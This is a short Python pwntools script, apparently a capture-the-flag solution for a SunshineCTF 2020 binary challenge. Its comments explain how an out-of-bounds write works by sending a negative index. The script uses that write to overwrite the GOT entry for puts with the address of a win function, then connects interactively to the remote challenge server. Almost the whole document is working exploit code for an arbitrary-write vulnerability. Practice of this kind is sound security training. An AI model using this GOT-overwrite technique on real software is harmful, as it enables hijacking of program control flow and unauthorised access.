# RazviOverflow
# Python3

from pwn import *

# The idea behind this is simply overwritting got.puts entry with the address of win
# so the binary jumps to win when it calls sym.imp.puts (the plt will resolve to the
# got entry and it'll be pointing to win instead) after the 2 scanf.

static = ELF("./chall_08")

address_of_win = static.symbols[b'win']

#binary = process("./chall_08")
binary = remote("chal.2020.sunshinectf.org", 30008)

# (x*8) + 0x600a40 = 0x6009e8 (address of puts)
# x*8 = -88
# x = -11'(1st input value)

binary.sendline("-11")
binary.sendline(str(address_of_win))
binary.interactive()